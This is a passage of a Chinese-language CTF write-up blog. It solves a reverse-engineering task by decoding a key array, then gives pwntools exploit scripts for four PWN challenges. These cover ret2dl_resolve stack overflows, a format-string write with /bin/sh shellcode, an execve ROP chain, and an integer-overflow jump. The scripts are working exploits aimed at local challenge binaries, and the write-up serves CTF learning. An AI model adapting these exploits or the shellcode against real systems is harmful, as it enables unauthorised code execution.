<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">012D30CD                      B8 775F123C     mov eax,0x3C125F77</span><br><span class="line">012D30D2                      D3C8            ror eax,cl</span><br><span class="line">012D30D4                      3382 E0000000   xor eax,dword ptr ds:[edx+0xE0]</span><br><span class="line">012D30DA                      8985 6CFFFFFF   mov dword ptr ss:[ebp-0x94],eax</span><br><span class="line">012D30E0                      90              nop</span><br><span class="line"></span><br><span class="line">012D3118                      8BC1            mov eax,ecx</span><br><span class="line">012D311A                      25 03000080     and eax,0x80000003</span><br><span class="line">012D311F                      79 05           jns short Fly.012D3126</span><br><span class="line">012D3121                      48              dec eax</span><br><span class="line">012D3122                      83C8 FC         or eax,0xFFFFFFFC</span><br><span class="line">012D3125                      40              inc eax</span><br><span class="line">012D3126                      8A8405 6CFFFFFF mov al,byte ptr ss:[ebp+eax-0x94]</span><br><span class="line">012D312D                      88840D 70FFFFFF mov byte ptr ss:[ebp+ecx-0x90],al</span><br></pre></td></tr></table></figure>
<p>定位初始secret的地方</p>
<p>借助xspy定位消息响应函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Message map: 0x0058880C (Fly3.exe+ 0x18880c )</span><br><span class="line">Message map entries: 0x00588818 (Fly3.exe+ 0x188818 )</span><br><span class="line">OnMsg:WM_TIMER(0113),func= 0x00404E30 (Fly3.exe+ 0x004e30 )</span><br><span class="line">OnMsg:WM_LBUTTONDOWN(0201),func= 0x00405150 (Fly3.exe+ 0x005150 )</span><br><span class="line">OnMsg:WM_LBUTTONUP(0202),func= 0x004051D0 (Fly3.exe+ 0x0051d0 )</span><br><span class="line">OnMsg:WM_MOUSEHOVER(02a1),func= 0x004051E0 (Fly3.exe+ 0x0051e0 )</span><br><span class="line">OnMsg:WM_MOUSELEAVE(02a3),func= 0x00405200 (Fly3.exe+ 0x005200 )</span><br><span class="line">OnMsg:WM_MOUSEMOVE(0200),func= 0x00405220 (Fly3.exe+ 0x005220 )</span><br><span class="line">OnMsg:WM_LBUTTONDBLCLK(0203),func= 0x004051D0 (Fly3.exe+ 0x0051d0 )</span><br></pre></td></tr></table></figure>
<p>定位到数组dwKey</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void __thiscall CFlyWnd::OnLButtonDown(CFlyWnd *this, unsigned int nFlags, CPoint point)</span><br><span class="line">&#123;</span><br><span class="line">  CFlyWnd *v3; // esi</span><br><span class="line">  int v4; // eax</span><br><span class="line">  char szOut[100]; // [esp+4h] [ebp-68h]</span><br><span class="line"></span><br><span class="line">  v3 = this;</span><br><span class="line">  szOut[0] = 0;</span><br><span class="line">  v4 = this-&gt;nIndex;</span><br><span class="line">  this-&gt;is_death = 1;</span><br><span class="line">  this-&gt;secret = dwKey[v4];</span><br><span class="line">  memset(&amp;szOut[1], 0, 0x63u);</span><br><span class="line">  _wsprintfA(szOut, &quot;fly death  %d&quot;, 1);</span><br><span class="line">  PostMessageW(v3-&gt;m_hWnd, 0x10u, 0, 0);</span><br><span class="line">  CWnd::Default((CWnd *)&amp;v3-&gt;vfptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwXorKey = 0x3c125f77;</span><br><span class="line">  DWORD dwKey[100] = &#123; 0x59206b45, 0xfa6d1fde, 0xaa30f5ec, 0x81b4728a, 0x43a213cf, 0x8c85f3cc, 0xe8922b1c, 0xdf191586, 0x4158266a, 0xdfac3b1c, 0xb9ae65f1, 0xde83b273, 0x914ba440, 0xcb8ed8f4, 0x4beac32d, 0x8cd64e10, 0x6b120c25, 0x498df831, 0xa2b9f93d, 0x79d6d0e4, 0x47c640f0, 0xa0c3dbd6, 0x7b4def96, 0x158e8c4d &#125;;</span><br><span class="line">  char szResult[100] = &#123; 0 &#125;;</span><br><span class="line">  for (int i = 0; i &lt; 24; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    DWORD dwTmp = dwKey[i] ^ CROR(dwXorKey, i);</span><br><span class="line">    </span><br><span class="line">    szResult[i] = (PBYTE(&amp;dwTmp))[i % 4];</span><br><span class="line">  &#125;</span><br><span class="line">  printf(szResult);</span><br></pre></td></tr></table></figure>
<p>得到flag:204f8ab152a0e8627fd21b01</p>
<p>本题可以不去进项算法分析，直接模拟点击点掉所有苍蝇即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL CALLBACK <span class="title">EnumWindowProc</span><span class="params">(HWND hWnd, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> szClassName[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">  GetClassName(hWnd, szClassName, <span class="number">100</span>);</span><br><span class="line">  RECT m_rect;</span><br><span class="line">  GetWindowRect(hWnd, &amp;m_rect);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"#32770"</span>, szClassName) == <span class="number">0</span> &amp;&amp; m_rect.bottom - m_rect.top == <span class="number">60</span> &amp;&amp; m_rect.right - m_rect.left == <span class="number">60</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    SendMessage(hWnd, WM_LBUTTONDOWN, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//在某个函数里面调用  </span></span><br><span class="line">  EnumWindows(EnumWindowProc, <span class="literal">NULL</span>);</span><br><span class="line">  Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a><strong>PWN</strong></h2><ul>
<li><strong>baby_stack</strong></li>
<li>没有输出无法leak，没有提供libc，有溢出，考虑ret2dl_resolve</li>
<li>可以手组结构，仿造roputils写ret2dl_resolve函数</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babystack'</span>)</span><br><span class="line">binary = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2dl_resolve</span><span class="params">(ELF_obj,func_name,resolve_addr,fake_stage,do_slim=<span class="number">1</span>)</span>:</span></span><br><span class="line">    jmprel = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_JMPREL"</span>)<span class="comment">#rel_plt</span></span><br><span class="line">    relent = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_RELENT"</span>)</span><br><span class="line">    symtab = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_SYMTAB"</span>)<span class="comment">#dynsym</span></span><br><span class="line">    syment = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_SYMENT"</span>)</span><br><span class="line">    strtab = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_STRTAB"</span>)<span class="comment">#dynstr</span></span><br><span class="line">    versym = ELF_obj.dynamic_value_by_tag(<span class="string">"DT_VERSYM"</span>)<span class="comment">#version</span></span><br><span class="line">    plt0 = ELF_obj.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    p_name = fake_stage+<span class="number">8</span>-strtab</span><br><span class="line">    len_bypass_version = <span class="number">8</span>-(len(func_name)+<span class="number">1</span>)%<span class="number">0x8</span></span><br><span class="line">    sym_addr_offset = fake_stage+<span class="number">8</span>+(len(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> == <span class="number">8</span>:</span><br><span class="line">            len_bypass_version+=<span class="number">8</span></span><br><span class="line">            sym_addr_offset = fake_stage+<span class="number">8</span>+(len(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            error(<span class="string">'something error!'</span>)</span><br><span class="line"></span><br><span class="line">    fake_sym = sym_addr_offset/<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        fake_ndx = u16(ELF_obj.read(versym+fake_sym*<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> fake_ndx != <span class="number">0</span>:</span><br><span class="line">            fake_sym+=<span class="number">1</span></span><br><span class="line">            len_bypass_version+=<span class="number">0x10</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> do_slim:</span><br><span class="line">        slim = len_bypass_version - len_bypass_version%<span class="number">8</span></span><br><span class="line">        version = len_bypass_version%<span class="number">8</span></span><br><span class="line">        resolve_data,resolve_call=ret2dl_resolve(ELF_obj,func_name,resolve_addr,fake_stage+slim,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (resolve_data,resolve_call,fake_stage+slim)</span><br><span class="line"></span><br><span class="line">    fake_r_info = fake_sym&lt;&lt;<span class="number">8</span>|<span class="number">0x7</span></span><br><span class="line">    reloc_offset=fake_stage-jmprel</span><br><span class="line"></span><br><span class="line">    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+<span class="string">'\x00'</span></span><br><span class="line">    resolve_data += <span class="string">'a'</span>*len_bypass_version</span><br><span class="line">    resolve_data += p32(p_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    resolve_call = p32(plt0)+p32(reloc_offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (resolve_data,resolve_call)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x4c</span></span><br><span class="line">stage = binary.bss()</span><br><span class="line">p_ebx_ret = <span class="number">0x080482c9</span></span><br><span class="line">p3ret = <span class="number">0x080484a9</span></span><br><span class="line"></span><br><span class="line">dl_data,dl_call,stage = ret2dl_resolve(binary,<span class="string">'system'</span>,binary.bss()+<span class="number">0x200</span>,stage)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*offset</span><br><span class="line">pay += p32(binary.plt[<span class="string">'read'</span>])+p32(p3ret)+p32(<span class="number">0</span>)+p32(stage)+p32(len(dl_data)+<span class="number">8</span>)   <span class="comment">#读40个字节到base_stage</span></span><br><span class="line">pay += dl_call  </span><br><span class="line">pay += p32(p_ebx_ret)+p32(stage+len(dl_data)) </span><br><span class="line"><span class="comment">#伪造条目</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(dl_data+<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#调用system</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li>也可用roputils简化脚本</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./baby_stack"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./baby_stack"</span>)</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">'./baby_stack'</span>)</span><br><span class="line">stage = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x4c</span></span><br><span class="line">vulFunc = <span class="number">0x804840b</span></span><br><span class="line"></span><br><span class="line">buf1 = <span class="string">'A'</span> * offset</span><br><span class="line">buf1 += p32(elf.symbols[<span class="string">'read'</span>]) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(stage) + p32(<span class="number">100</span>)    </span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(stage+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line"></span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line">buf3 = <span class="string">"A"</span>*offset + rop.dl_resolve_call(stage+<span class="number">20</span>,stage)</span><br><span class="line">p.send(buf3)</span><br><span class="line"></span><br><span class="line">p.interactive()<span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> roputils</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./baby_stack"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./baby_stack"</span>)</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(<span class="string">'./baby_stack'</span>)</span><br><span class="line">stage = rop.section(<span class="string">'.bss'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x4c</span></span><br><span class="line">vulFunc = <span class="number">0x804840b</span></span><br><span class="line"></span><br><span class="line">buf1 = <span class="string">'A'</span> * offset</span><br><span class="line">buf1 += p32(elf.symbols[<span class="string">'read'</span>]) + p32(vulFunc) + p32(<span class="number">0</span>) + p32(stage) + p32(<span class="number">100</span>)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 = rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(stage+<span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br><span class="line"></span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line">buf3 = <span class="string">"A"</span>*offset + rop.dl_resolve_call(stage+<span class="number">20</span>,stage)</span><br><span class="line">p.send(buf3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>dragon_game</strong></li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./DragonGame"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"secret[0] is "</span>)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">"addr:"</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"west?:\n"</span>,<span class="string">"east"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"address'\n"</span>,str(addr))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">" is:\n"</span>,<span class="string">"%233c%7$n"</span>)   <span class="comment">#修改check[0]=233</span></span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span>        <span class="comment">#Linux/x64 Execute /bin/sh Shellcode</span></span><br><span class="line">p.sendlineafter(<span class="string">"SPELL\n"</span>, shellcode)   </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>easy_rop</strong></li>
<li>通过__libc_csu_init()函数来构造gadgets</li>
<li>通过设置eax为59调用execve(‘/bin/sh’,NULL,NULL)</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easy_rop"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easy_rop"</span>)</span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400582</span></span><br><span class="line">rop_addr1 = <span class="number">0x4005fa</span>            <span class="comment">#&lt;__libc_csu_init+90&gt;</span></span><br><span class="line">rop_addr2 = <span class="number">0x4005e0</span>            <span class="comment">#&lt;__libc_csu_init+64&gt;</span></span><br><span class="line">bss_addr = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bss段写入/bin/sh和syscall的地址</span></span><br><span class="line">rop = <span class="string">""</span></span><br><span class="line">rop += offset*<span class="string">"A"</span></span><br><span class="line">rop += p64(rop_addr1)</span><br><span class="line">rop += p64(<span class="number">0</span>)                   <span class="comment">#rbx</span></span><br><span class="line">rop += p64(<span class="number">1</span>)                   <span class="comment">#rbp</span></span><br><span class="line">rop += p64(elf.got[<span class="string">'read'</span>])     <span class="comment">#r12</span></span><br><span class="line">rop += p64(<span class="number">0x20</span>)                <span class="comment">#r13    #rdx</span></span><br><span class="line">rop += p64(bss_addr)            <span class="comment">#r14    #rsi</span></span><br><span class="line">rop += p64(<span class="number">0</span>)                   <span class="comment">#r15    #rdi</span></span><br><span class="line">rop += p64(rop_addr2)           <span class="comment">#ret    #read(0, bss_addr, 0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置eax为59</span></span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)                   <span class="comment">#rbx</span></span><br><span class="line">rop += p64(<span class="number">1</span>)                   <span class="comment">#rbp</span></span><br><span class="line">rop += p64(elf.got[<span class="string">'read'</span>])     <span class="comment">#r12</span></span><br><span class="line">rop += p64(<span class="number">0x40</span>)                <span class="comment">#r13    #rdx</span></span><br><span class="line">rop += p64(bss_addr+ <span class="number">0x10</span>)      <span class="comment">#r14    #rsi</span></span><br><span class="line">rop += p64(<span class="number">0x0</span>)                 <span class="comment">#r15    #rdi</span></span><br><span class="line">rop += p64(rop_addr2)           <span class="comment">#ret    #read(0, bss_addr+0x10, 0x40)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve('/bin/sh', NULL, NULL)</span></span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(bss_addr + <span class="number">8</span>)        <span class="comment">#syscall</span></span><br><span class="line">rop += p64(<span class="number">0</span>)                   <span class="comment">#NULL</span></span><br><span class="line">rop += p64(<span class="number">0</span>)                   <span class="comment">#NULL</span></span><br><span class="line">rop += p64(bss_addr)            <span class="comment">#'/bin/sh'</span></span><br><span class="line">rop += p64(rop_addr2)           <span class="comment">#execve('/bin/sh', NULL, NULL)</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.sendline(rop)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次read</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send((<span class="string">"/bin/sh\x00"</span>+p64(syscall_addr)).ljust(<span class="number">0x20</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次read</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">"A"</span>*<span class="number">59</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>login</strong></li>
<li>存在整数溢出，passwd可以输入409长度，当输入大于260长度时也可符合判定，跳到特定函数即可拿flag</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./login"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"username:\n"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*offset</span><br><span class="line">payload += p32(<span class="number">0x804868b</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">261</span>,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"passwd:\n"</span>,payload)</span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

    
  </div>
</article>


   
  <div class="text-center donation">
    <div class="inner-donation">
      <span class="btn-donation">支持一下</span>
      <div class="donation-body">
        <div class="tip text-center">扫一扫，支持作者</div>
        <ul class="theme.donation.items.length">
        
          <li class="item">
            <img src="/images/qr-wechat.png" alt="">
          </li>
        
        </ul>
      </div>
    </div>
  </div>


   
  <div class="box-prev-next clearfix">
    <a class="show pull-left" href="/2018/09/12/首届新疆网络安全知识技能竞赛(个人赛)/">
        <i class="icon icon-angle-left"></i>
    </a>
    <a class="show pull-right" href="/2018/09/18/新疆首届攻防比赛wp/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/category/"
              rel="noopener noreferrer"
              target="_self"
              >
              分类
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/link/"
              rel="noopener noreferrer"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="ROUND_RECT"
              href="/about/"
